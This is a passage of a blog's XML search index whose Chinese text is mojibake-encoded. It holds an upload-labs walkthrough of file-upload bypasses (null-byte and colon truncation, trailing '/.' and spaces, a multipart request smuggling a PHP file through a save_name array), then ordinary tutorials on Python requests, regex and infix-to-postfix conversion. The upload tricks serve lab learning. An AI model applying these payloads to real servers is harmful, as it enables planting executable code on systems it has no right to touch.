move_uploaded_file(A,B)å‡½æ•°ï¼šæ­¤å‡½æ•°å°†ä¼šæ£€æŸ¥æ–‡ä»¶Aæ˜¯å¦æ˜¯åˆæ³•çš„ä¸Šä¼ æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œå°†æŠŠæ–‡ä»¶Aç§»åŠ¨åˆ°Bçš„ç›®å½•ä¸‹ï¼›å¦åˆ™å°†ä¼šè¿”å›falseï¼Œå¹¶ä¸”ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚ ç»•è¿‡æ–¹æ³•ä¸€ï¼š %00æˆªæ–­ ï¼ˆå‰é¢å·²ç»å†™äº†ï¼‰ 111.php%00upload-19.jpg å…¶ä¸­ï¼Œ%00æ˜¯url-decodeä¹‹åçš„ æ–¹æ³•äºŒï¼š åˆ©ç”¨move_uploaded_fileï¼ˆï¼‰å‡½æ•°å’Œé»‘åå•ç»“åˆå­˜åœ¨çš„æ¼æ´ï¼š move_uploaded_fileï¼ˆA,Bï¼‰å‡½æ•°ï¼šæ­¤å‡½æ•°å°†ä¼šæ£€æŸ¥æ–‡ä»¶Aæ˜¯å¦æ˜¯åˆæ³•çš„ä¸Šä¼ æ–‡ä»¶ï¼Œå¦‚æœæ˜¯ï¼Œå°†æŠŠæ–‡ä»¶Aç§»åŠ¨åˆ°Bçš„ç›®å½•ä¸‹ï¼›å¦åˆ™å°†ä¼šè¿”å›falseï¼Œå¹¶ä¸”ä¸æ‰§è¡Œä»»ä½•æ“ä½œã€‚ ç”±äºè¿™é‡Œåˆ©ç”¨äº†é»‘åå•ï¼Œåˆ™move_uploaded_fileï¼ˆï¼‰å‡½æ•°åœ¨åˆ¤æ–­æ—¶åªä¼šåˆ¤æ–­æ˜¯å¦ä¸ºé»‘åå•ï¼Œå¦‚æœä¸æ˜¯ï¼Œé‚£ä¹ˆä»–å°†ä¼šç›´æ¥å°†æ–‡ä»¶ä¿å­˜åœ¨æŒ‡å®šç›®å½•ä¸‹ã€‚æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ /.(æ–œæ ç‚¹)å’Œ ç©ºæ ¼ï¼ˆç©ºæ ¼ï¼‰è¿›è¡Œç»•è¿‡ã€‚ ï¼ˆ1ï¼‰ â€œ/.â€(æ–œæ ç‚¹) â€‹ upload-19.php/. ï¼ˆ2ï¼‰â€œ â€ï¼ˆç©ºæ ¼ï¼‰ â€‹ upload-19.php â€‹ ï¼ˆ3ï¼‰â€œ .â€ï¼ˆç©ºæ ¼ï¼‰ upload-19.php. upload-19.php. ç‚¹+ç©ºæ ¼ ç­‰ç­‰â€¦ æ–¹æ³•ä¸‰ï¼š Windowså†’å·æˆªæ–­ upload-19.php:.jpg (æˆ‘åšçš„å®éªŒï¼Œphpä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯å†…å®¹æ¸…ç©ºäº†) Pass - 21 å‚è€ƒ: https://blog.csdn.net/kekefen01/article/details/90346413 é€šè¿‡ä¼ é€’æ•°ç»„ç»•è¿‡ã€‚å±äºé€»è¾‘æ¼æ´ï¼Œæ²¡æœ‰è€ƒè™‘æ•°ç»„ç¬¬äºŒä¸ªå…ƒç´ ä¸å­˜åœ¨çš„æƒ…å†µã€‚ ç»•è¿‡ä½¿ç”¨å¤šä¸ªæ•°ç»„ ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="upload_file"; filename="info.php" Content-Type: image/jpeg &lt;?php phpinfo();?&gt; ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="save_name[0]" info.php/ ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="save_name[2]" jpg ------WebKitFormBoundaryDTdqZdRoon2GpWOE Content-Disposition: form-data; name="submit" ä¸Šä¼  ------WebKitFormBoundaryDTdqZdRoon2GpWOE-- æœ€ç»ˆæ–‡ä»¶åä¸ºâ€œinfo.php/.â€ å› ä¸ºmove_uploaded_fileåº•å±‚ä¼šè°ƒç”¨tsrm_realpathå‡½æ•°å¯¼è‡´ï¼Œé€’å½’åˆ é™¤æ–‡ä»¶åæœ€åçš„/. å‚è€ƒæ–‡ç« ï¼šhttps://blog.csdn.net/weixin_43901038/article/details/94890631 https://www.cnblogs.com/shellr00t/p/6426945.html https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonä¹‹requestsåº“]]></title>
    <url>%2Fposts%2F659559f6%2F</url>
    <content type="text"><![CDATA[Requestsæ˜¯åŸºäºurllib3æ¥æ”¹å†™çš„ï¼Œé‡‡ç”¨Apache2 Licensed æ¥æºåè®®çš„HTTPåº“ã€‚ å®ƒæ¯”urllibæ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥èŠ‚çº¦æˆ‘ä»¬å¤§é‡çš„å·¥ä½œï¼Œå®Œå…¨æ»¡è¶³HTTPæµ‹è¯•éœ€æ±‚ã€‚ å®‰è£…pip install requests ä½¿ç”¨æµ‹è¯•ç½‘ç«™ï¼šhttp://httpbin.org/ GETè¯·æ±‚import requests # ä¸å¸¦å‚æ•° r = requests.get('http://httpbin.org/get') print(r.text) # æºå¸¦å‚æ•° data = { 'name':'zhangsan', 'age':20, } r1 = requests.get('http://httpbin.org/get', params=data) r3.encoding = 'utf-8' # è®¾ç½®ç¼–ç  print(r1.text) #å¦‚æœæ˜¯ä¸­æ–‡æˆ–è€…æœ‰å…¶ä»–ç‰¹æ®Šç¬¦å·ï¼Œåˆ™è¿›è¡Œurlç¼–ç  from urllib.parse import urlencode job = "ç¨‹åºå‘˜" parm = urlencode(job, encoding="utf-8") # å†è¿›è¡Œæ‹¼æ¥åè¿›è¡Œåç»­è¯·æ±‚... POSTè¯·æ±‚import requests # ä¸å¸¦å‚æ•° r = requests.post('http://httpbin.org/post') print(r.text) # æºå¸¦å‚æ•° data = { 'user': 1, 'pwd': 'hhh', 'submit': 'submit', } r1 = requests.post('http://httpbin.org/post', data=data) è¯·æ±‚å¤´ # è‡ªå®šä¹‰è¯·æ±‚å¤´ headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36', } response1 = requests.get(url, headers=headers,params=data) # æ‰“å°è¯·æ±‚å¤´ print(response1.request.headers) # ä¸¤ç§éå†æ–¹å¼ for key, value in r3.headers.items(): print(key+":"+value) print("************************************") for key in r3.headers: # ä¸æ˜¯è¯·æ±‚å¤´ print(key + ":" + (r3.headers)[key]) å“åº”ä¿¡æ¯# å“åº”å¤´ print(response1.headers) # å…¶ä»–ä¿¡æ¯ print(response1.headers['Server']) print(response1.url) # æ‰“å°url print(response1.status_code) # çŠ¶æ€ç  200 print(response1.cookies.items()) # cookie print(response1.apparent_encoding) # æä¾›çš„ç¼–ç  print(response1.elapsed) # è¯·æ±‚åˆ°å“åº”çš„æ—¶é—´ print(r.history) # historyå±æ€§å¾—åˆ°è¯·æ±‚å†å² # cookieæ“ä½œ print(response1.headers['Set-Cookie']) print(response.text) # å“åº”è¿”å›çš„æ•°æ®: str print(response.content) # å“åº”è¿”å›çš„æ•°æ®: äºŒè¿›åˆ¶å½¢å¼ # å¯¹æ–‡ä»¶å†…å®¹æŸ¥æ‰¾(æ¯”å¦‚è¢«å®‰å…¨ç‹—æ‹¦æˆªåé¡µé¢ä¸­ä¼šæœ‰å…³é”®å­—:`safedog`) ... if response.text.find('safedor'): print('è¢«æ‹¦æˆª') else: print('ç»•è¿‡') ... # æ¯”å¦‚çˆ¬å›¾ç‰‡ï¼ŒéŸ³ä¹ï¼Œè§†é¢‘å°±æ˜¯ç”¨çš„äºŒè¿›åˆ¶æ•°æ® import requests response = requests.get('http://xpshuai.cn/favicon.ico') # ä¿å­˜å›¾ç‰‡ wbå†™å…¥ with open('favicon.ico','wb')as f: f.write(response.content) è§£æjsonä½¿ç”¨jsonï¼ˆï¼‰æ–¹æ³•ï¼Œå°±å¯ä»¥å°†è¿”å›ç»“æœæ˜¯JSONæ ¼å¼çš„å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå­—å…¸ import requests r = requests.get('http://httpbin.org/get') print(r.text) print(type(r.text)) # &lt;class 'str'> print(r.json()) print(type(r.json())) # &lt;class 'dict'> SSLè¯ä¹¦æ£€éªŒ# å‚æ•° verify=Falseæ—¶è¡¨ç¤ºï¼Œå¯¹äº https ä¸éªŒè¯è¯ä¹¦ r = requests.get(url1, verify=False) è®¾ç½®ä»£ç†import requests proxies = {'http': ' http://127.0.0.1:8080', 'https': ' https://127.0.0.1:8080'} r = requests.get(url, proxies=proxies, verify=False) å¯ä»¥è®¾ç½®ä»£ç†æ± , éšæœºæ›´æ¢ proxies = [] request = requests.get(url, proxies={'http': random.choice(proxies)}, headers=head) è‡ªå®šä¹‰cookie#æ‰“å°cookie for key,value in r.cookies.items(): print(key + '=' + value) 1.ç®€å•çš„åšæ³•: import requests headers = { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/" "537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" } cookies = {"cookie_name": "cookie_value", } response = requests.get(url, headers=headers, cookies=cookies) 2.CookieJar æ›´ä¸“ä¸šçš„æ–¹å¼:å…ˆå®ä¾‹åŒ–ä¸€ä¸ªRequestCookieJarçš„ç±»ï¼Œç„¶åæŠŠå€¼setè¿›å»ï¼Œæœ€ååœ¨get,postæ–¹æ³•é‡Œé¢æŒ‡å®šcookieså‚æ•° from http.cookiejar import CookieJar requests.cookies.update() c = requests.cookies.RequestsCookieJar() c.set('cookie-name', 'cookie-value', path='/', domain='.abc.com') s.cookies.update(c) 3.requests.Session()æ–¹æ³• session = requests.Session() session.cookies['cookie'] = 'cookie-value' # åŠŸèƒ½ï¼šå¯ä»¥æ·»åŠ cookieï¼Œä¸ä¼šæ¸…é™¤åŸcookie # ç¼ºç‚¹ï¼šä¸èƒ½è®¾ç½®pathï¼Œdomainç­‰å‚æ•° sessionä¼šè¯ç»´æŒ åœ¨requestsä¸­ï¼Œå¦‚æœç›´æ¥åˆ©ç”¨getï¼ˆï¼‰æˆ–postï¼ˆï¼‰ç­‰æ–¹æ³•çš„ç¡®å¯ä»¥åšåˆ°æ¨¡æ‹Ÿç½‘é¡µçš„è¯·æ±‚ï¼Œä½†æ˜¯è¿™å®é™…ä¸Šæ˜¯ç›¸å½“äºä¸åŒçš„ä¼šè¯ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºä½ ç”¨äº†ä¸¤ä¸ªæµè§ˆå™¨æ‰“å¼€äº†ä¸åŒçš„é¡µé¢ã€‚ import requests headers = { "content-type": "application/x-www-form-urlencoded;charset=UTF-8", "User-Agent" : "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.6) ", } #è®¾ç½®ä¸€ä¸ªä¼šè¯sessionå¯¹è±¡s s = requests.session() resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # æ‰“å°è¯·æ±‚å¤´å’Œcookies print(resp.request.headers) print(resp.cookies) # åˆ©ç”¨så†è®¿é—®ä¸€æ¬¡ resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # è¯·æ±‚å¤´å·²`ä¿æŒ`é¦–æ¬¡è¯·æ±‚åäº§ç”Ÿçš„cookie print(resp.request.headers) å¼‚å¸¸å¤„ç†è¿›è¡Œç½‘ç»œè¯·æ±‚çš„æ—¶å€™ï¼Œéš¾å…ä¼šå‡ºé”™ï¼Œè¿™æ—¶å€™ä¸ºäº†ç¨‹åºèƒ½å¤Ÿç»§ç»­è¿è¡Œä¸‹å»ï¼Œå°±è¦å¯¹å¼‚å¸¸è¿›è¡Œå¤„ç† # æœ€ç®€å•çš„ä¸€ç§ try: # è¯·æ±‚è¿‡ç¨‹ r = requests.get(url1, headers=headers, verify=False, params=data, cookies=cookies) # ...... except Exception as e: time.sleep(1) print(e) finally: print("ç¨‹åºæ‰§è¡Œç»“æŸ!") æ–‡ä»¶ä¸Šä¼ import requests files = { 'file':open('favicon.ico','rb') } r = requests.post('http://www.httpbin.org/post',files=files) print(r.text) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>requests</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ­£åˆ™è¡¨è¾¾å¼]]></title>
    <url>%2Fposts%2F6bab798e%2F</url>
    <content type="text"><![CDATA[å¸¸ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥å¯¹çˆ¬å–çš„ç½‘é¡µè¿›è¡Œè§£æï¼Œä½†æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„æ„é€ ç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œä¸€èˆ¬åœ¨ç»“æ„åŒ–çš„ç½‘é¡µä¸­æ²¡å¿…è¦ç”¨æ­£åˆ™ï¼ˆæ˜“å‡ºé”™ï¼‰ # findall a = re.findall('jianeng',s ) ## æœç´¢å­—ç¬¦ä¸²ï¼Œä»¥åˆ—è¡¨ç±»å‹è¿”å›å…¨éƒ¨èƒ½åŒ¹é…çš„å­ä¸² print(a) #search() # åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœç´¢ï¼ŒåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œè¿”å›matchå¯¹è±¡ &lt;_sre.SRE_Match object; span=(1, 8), match='jianeng'> åªèƒ½æ‰¾åˆ°ç¬¬ä¸€æ¬¡å‡ºç°çš„ a = re.search('jianeng',s) print(a) #finditer() # æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªåŒ¹é…ç»“æœçš„è¿­ä»£ç±»å‹ï¼Œ # æ¯ä¸ªè¿­ä»£å…ƒç´ æ˜¯matchå¯¹è±¡ s = 'sjianengsdfasjianeng15sadfjianeng666' finditer = re.finditer('jianeng',s) print(finditer ) ##è·å–matchå¯¹è±¡ä¸­çš„å€¼ for i in finditer: print(i) print(i.group()) #froup() è¿”å›åŒ¹é…åˆ°çš„å­—ç¬¦ä¸² print(i.start() ) #è¿”å›åŒ¹é…çš„å¼€å§‹ä½ç½® print(i.end() ) #è¿”å›åŒ¹é…çš„ç»“æŸä½ç½® print(i.span() ) # è¿”å›ä¸€ä¸ªå…ƒç»„è¡¨ç¤ºåŒ¹é…ä½ç½®ï¼ˆå¼€å§‹ï¼Œç»“æŸï¼‰ #sub() # æ›¿æ¢ ç±»ä¼¼äºå­—ç¬¦ä¸²ä¸­ replace() æ–¹æ³• s2 = re.sub('jianeng','666',s,count=2) print(s2) # compile() # ç¼–è¯‘æ­£åˆ™è¡¨è¾¾å¼ä¸ºæ¨¡å¼å¯¹è±¡ a = re.compile('jianeng') # a è¦åŒ¹é…jianeng dd='fsadfasfjkjianeng' b = a.findall(dd) print(b ) #re.split() # å°†ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ç…§æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç»“æœè¿›è¡Œåˆ†å‰²ï¼Œè¿”å›åˆ—è¡¨ç±»å‹ c = re.split('jianeng',s,maxsplit=2) print(c) import re #####å…ƒå­—ç¬¦ ##é€šé…ç¬¦ -> . ç‚¹ -> è¡¨ç¤ºä»»æ„ä¸€ä¸ªå­—ç¬¦ res = re.findall(r'a','abcad') #ç»Ÿä¸€ä½¿ç”¨rå–æ¶ˆè½¬ä¹‰ å»å³è¾¹å­—ç¬¦ä¸²ä¸­æ‰¾æ‰€æœ‰æ»¡è¶³å·¦è¾¹æ ¼å¼çš„å­å­—ç¬¦ä¸² print(res) #['a', 'a'] res = re.findall(r'a..','abcad') print(res) #['abc'] ##é”šç‚¹å…ƒå­—ç¬¦ # ^ é”å®šè¡Œé¦– res = re.findall(r'^a.','abcad') print(res) #['ab'] # $ é”å®šè¡Œå°¾ res = re.findall(r'a.$','abcad') print(res) # ['ad'] ##å•è¯è¾¹ç•Œ(ä¸æ˜¯å…ƒå­—ç¬¦)ï¼š \b res = re.findall(r'dog','Just dog Monica doggie Irene') print(res) # ['dog', 'dog'] #ç¬¬äºŒä¸ªdogä¸æ˜¯å•ç‹¬çš„dogå•è¯ res = re.findall(r'\bdog\b','Just dog Monica doggie Irene') print(res) # ['dog'] ###é‡å¤å…ƒå­—ç¬¦ ####è´ªå©ª ï¼ˆå°½å¯èƒ½åŒ¹é…çš„å¤šï¼‰ res = re.findall(r'ab{4}c','abbbbc') #è¿ç»­4ä¸ªb æŠŠèŠ±æ‹¬å·å‰é¢ç´§æŒ¨ç€çš„é‡å¤å¤šå°‘æ¬¡ print(res) #['abbbbc'] res = re.findall(r'ab{2,4}c','abbbc') #åŒ¹é…2åˆ°4ä¸ªb #æ­£åˆ™ä¸è®¸åŠ ç©ºæ ¼ print(res) #['abbbc'] res = re.findall(r'ab{2,}c','abbbbbbbbbc') #åŒ¹é…2çš„åˆ°å¤šä¸ªï¼Œè‡³å°‘2ä¸ª print(res) #['abbbbbbbbbc'] ### res = re.findall(r'ab*c','abbbc') # * ä»»æ„å¤šä¸ªé‡å¤, ç›¸å½“äº{0,} print(res) res = re.findall(r'ab+c','abbbc') # * ä¸€ä¸ªæˆ–å¤šä¸ªï¼Œä¸€åˆ°æ­£æ— ç©·,ç›¸å½“äº {1,} print(res) res = re.findall(r'ab?c','abbbc') # * ä¸€ä¸ªæˆ–è€…æ²¡æœ‰ ,ç›¸å½“äº {0,1} print(res) ######éè´ªå©ª (å°½å¯èƒ½åŒ¹é…çš„å°‘) åé¢åŠ ä¸€ä¸ª ï¼Ÿ res = re.findall(r'ab*','abbc') # è¿™æ˜¯è´ªå©ª print(res) #['abb'] res = re.findall(r'ab*ï¼Ÿ','abbc') print(res) # è¿™æ˜¯éè´ªå©ª # *? #ä»»æ„å¤šä¸ª # +? #ä¸€ä¸ªæˆ–å¤šä¸ª # ?? #ä¸€ä¸ªæˆ–æ²¡æœ‰ ###é€‰æ‹©å…ƒå­—ç¬¦ | res = re.findall(r'ab|bc','abc-adc-aec-bca') #äºŒé€‰ä¸€ # | æˆ– print(res) # ['ab', 'bc'] #é€‰çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ res = re.findall(r'a[bd]c','abc-adc-aec-bca') # å¤šé€‰ä¸€ ï¼Œ [] æ–¹æ‹¬å· è¡¨ç¤ºä½ æƒ³è¦åˆ—ä¸¾çš„æ‰€æœ‰æƒ…å†µï¼Œä½†æ˜¯,ä»…ä»…ä¸€ä¸ªå­—ç¬¦ print(res) # ['abc', 'adc'] #é€‰çš„æ˜¯æ–¹æ‹¬å·é‡Œé¢çš„ä¸€ä¸ªå­—ç¬¦ ï¼Œ ã€ã€‘é‡Œé¢çš„é€—å·è¡¨ç¤ºåŒ¹é…é€—å· res = re.findall(r'a[^bd]c','abc-adc-aec-bca') # ^åœ¨[]é‡Œé¢çš„è¯ï¼Œæ”¾åœ¨ç¬¬ä¸€ä½ï¼Œè¡¨ç¤ºåå‘ print(res) # é™¤äº†bå’Œd res = re.findall(r'a[a-e]c','abc-adc-aec-bca-a^c') #ç”¨ - è¿æ¥è¡¨ç¤ºèŒƒå›´ [a-zA-Z0-9_]ä»»æ„å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ print(res) ####è½¬ä¹‰å…ƒå­—ç¬¦ åŒ¹é…å­—ç¬¦æœ¬èº« \ åæ–œæ  res = re.findall(r'.+.','1+2') print(res) #['1+2'] ä¸æ˜¯åŒ¹é…åˆ°äº†åŠ å· res = re.findall(r'1\+2','1+2') #å¾—åˆ°å…ƒå­—ç¬¦çš„å­—é¢å€¼ print(res) #['1+2'] ######é¢„å®šä¹‰å­—ç¬¦ç±» # \d #ä»»ä¸€æ•°å­—å­—ç¬¦ -> [0-9] # \D #ä»»ä¸€éæ•°å­—å­—ç¬¦ -> [^0-9] # \s #ä»»ä¸€ç©ºç™½ç¬¦ -> [\t\n\x0B\f\r] # \S #ä»»ä¸€éç©ºç™½ç¬¦ -> [^\t\n\x0B\f\r] # \w #ä»»ä¸€å­—æ¯æ•°å­—å­—ç¬¦ -> [a-zA-Z0-9] # \W #ä»»ä¸€éå­—æ¯æ•°å­—å­—ç¬¦ -> [^a-zA-Z0-9] ######åˆ†ç»„ res = re.findall(r'a(bc)+d','abcbcbcd') #åªèƒ½åŒ¹é…ä¸€ä¸ªbc æ‹¬å·é‡Œé¢çš„å˜æˆä¸€ä¸ªæ•´ä½“ ä¸€ä¸ªæ‹¬å·å°±æ˜¯ä¸€ä¸ªç»„ print(res) # ['bc'] res = re.findall(r'(a(bc)+d)','abcbcbcd') #å¤§ç»„å¥—å°ç»„ print(res) # [('abcbcbcd', 'bc')] res = re.findall(r'a(b|c)c','abc-acc-adc-aec') #ä¸a[bc]cç±»ä¼¼ print(res) # ['b', 'c'] ##æŒ‰ç»„æå–æ•°æ® res = re.findall(r'(\w+)-(\w+)-(\w+)-(\w+)','abc-dc-acc-aaec') print(res) # [('abc', 'acc', 'adc', 'aec')] res = re.search(r'(?P&lt;year>\d+)-(?P&lt;month>\d+)-(?P&lt;day>\d+)','2018-03-13') print(res.groupdict()) # {'year': '2018', 'month': '03', 'day': '13'} """ æ³¨æ„ï¼š å¦‚æœæ­£åˆ™è¡¨è¾¾å¼ä¸­ä½¿ç”¨äº†æ‹¬å·ï¼Œ é‚£ä¹ˆfindallå‡½æ•°åŒ¹é…çš„ç»“æœ åªä¼šæ˜¯æ‹¬å·ä¸­çš„å†…å®¹ï¼Œ è€Œä¸æ˜¯å®Œæ•´çš„åŒ¹é…ã€‚ å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç§æœºåˆ¶æ¥ å®Œæ•´å¯¹éœ€è¦éƒ¨åˆ†çš„æ•°æ®æå– """ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>æ­£åˆ™</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸­ç¼€è¡¨è¾¾å¼è½¬æ¢ä¸ºåç¼€è¡¨è¾¾å¼]]></title>
    <url>%2Fposts%2F94a5b228%2F</url>
    <content type="text"><![CDATA[ä¸­ç¼€è¡¨è¾¾å¼è½¬æ¢åç¼€è¡¨è¾¾å¼3.1 è§„åˆ™ 1ã€åˆå§‹åŒ–æ ˆå’Œé›†åˆï¼šè¿ç®—ç¬¦å·æ ˆs1å’Œå­˜å‚¨ç©ºé—´é›†åˆs2 2ã€ä»å·¦åˆ°å³æ‰«æä¸­ç¼€è¡¨è¾¾å¼ 3ã€é‡åˆ°æ“ä½œæ•°æ—¶ï¼Œå°†å…¶åŠ å…¥s2 4ã€é‡åˆ°è¿ç®—ç¬¦æ—¶ï¼Œæ¯”è¾ƒå…¶ä¸s1æ ˆé¡¶è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ - 4.1ã€å¦‚æœs1ä¸ºç©ºï¼Œæˆ–æ ˆé¡¶è¿ç®—ç¬¦ä¸ºå·¦æ‹¬å·â€˜(â€™ï¼Œåˆ™ç›´æ¥å°†æ­¤è¿ç®—ç¬¦å…¥æ ˆ - 4.2ã€å¦åˆ™ï¼Œè‹¥ä¼˜å…ˆçº§æ¯”æ ˆé¡¶è¿ç®—ç¬¦çš„é«˜ï¼Œä¹Ÿå°†è¿ç®—ç¬¦å‹å…¥s1 - 4.3ã€å¦åˆ™ï¼Œå°†s1æ ˆé¡¶çš„è¿ç®—ç¬¦å¼¹å‡ºå¹¶åŠ å…¥åˆ°s2ä¸­ï¼Œå†æ¬¡è½¬åˆ° æµç¨‹4 5ã€é‡åˆ°æ‹¬å·æ—¶ï¼š - 5.1ã€å¦‚æœæ˜¯å·¦æ‹¬å·â€˜(â€™ï¼Œåˆ™ç›´æ¥å‹å…¥s1 - 5.2ã€å¦‚æœæ˜¯å³æ‹¬å·â€˜)â€™ï¼Œåˆ™ä¾æ¬¡å¼¹å‡ºs1æ ˆé¡¶çš„è¿ç®—ç¬¦ï¼Œå¹¶ä¸”åŠ å…¥s2ï¼Œç›´åˆ°é‡åˆ°å·¦æ‹¬å·ä¸ºæ­¢ï¼Œæ­¤æ—¶å°†è¿™ä¸€å¯¹æ‹¬å·ä¸¢å¼ƒ 6ã€é‡å¤æ­¥éª¤ 2-5ï¼Œç›´åˆ°è¡¨è¾¾å¼çš„æœ€å³è¾¹ 7ã€å°†s1ä¸­å‰©ä½™çš„è¿ç®—ç¬¦ä¾æ¬¡å¼¹å‡ºå¹¶åŠ å…¥s2 8ã€s2ç»“æœå³ä¸ºä¸­ç¼€è¡¨è¾¾å¼å¯¹åº”çš„åç¼€è¡¨è¾¾å¼ 3.2 å®ä¾‹ä»¥ä¸Šé¢çš„è½¬æ¢ä¸ºå®ä¾‹ï¼Œæ¯”å¦‚è¾“å…¥ 1 + ( ( 2 + 3 ) * 4 ) - 5ï¼Œé‚£ä¹ˆæ€ä¹ˆè½¬æ¢æˆåç¼€è¡¨è¾¾å¼å‘¢ï¼Ÿ æ‰«æåˆ°çš„å…ƒç´  s2é›†åˆä¸­å…ƒç´  s1(æ ˆåº•-&gt;æ ˆé¡¶) è¯´æ˜ 1 1 ç©º æ•°å­— ç›´æ¥åŠ å…¥åˆ°é›†åˆä¸­ + 1 + s1ä¸ºç©ºï¼Œç›´æ¥å…¥æ ˆ ( 1 +( å·¦æ‹¬å· ç›´æ¥å…¥æ ˆ ( 1 +( ( åŒä¸Š 2 12 +( ( æ•°å­— + 12 +( (+ s1æ ˆé¡¶æ˜¯å·¦æ‹¬å·ï¼Œè¿ç®—ç¬¦ç›´æ¥å…¥æ ˆ 3 123 +( (+ æ•°å­— ) 123+ +( å³æ‹¬å·ï¼Œå¼¹å‡ºè¿ç®—ç¬¦ç›´è‡³é‡åˆ°å·¦æ‹¬å· * 123+ +( * s1æ ˆé¡¶æ˜¯å·¦æ‹¬å·ï¼Œè¿ç®—ç¬¦ç›´æ¥å…¥æ ˆ 4 123+4 +( * æ•°å­— ) 123+4 * + å³æ‹¬å·ï¼Œå¼¹å‡ºè¿ç®—ç¬¦ç›´è‡³é‡åˆ°å·¦æ‹¬å· - 123+4 *+ - -ä¸+ä¼˜å…ˆçº§ç›¸åŒï¼Œå› æ­¤å¼¹å‡º+å·ï¼Œåœ¨å‹å…¥- 5 123+4 *+ 5 - æ•°å­— åˆ°è¾¾æœ€å³ç«¯ 123+4 *+ 5 - ç©º s1ä¸­å‰©ä½™çš„è¿ç®—ç¬¦ è‡³æ­¤æ•´ä¸ªè¿‡ç¨‹è½¬æ¢å®Œæ¯• å³ä¸­ç¼€è¡¨è¾¾å¼1 + ( ( 2 + 3 ) 4 ) - 5 çš„åç¼€è¡¨è¾¾å¼ä¸º1 2 3 + 4 + 5 - éåŸåˆ›åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_36144258/article/details/95075064 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ•°æ®ç»“æ„ä¸ç®—æ³•</category>
      </categories>
      <tags>
        <tag>æ•°æ®ç»“æ„ä¸ç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-å­˜å‚¨ç®¡ç†]]></title>
    <url>%2Fposts%2F3c80c560%2F</url>
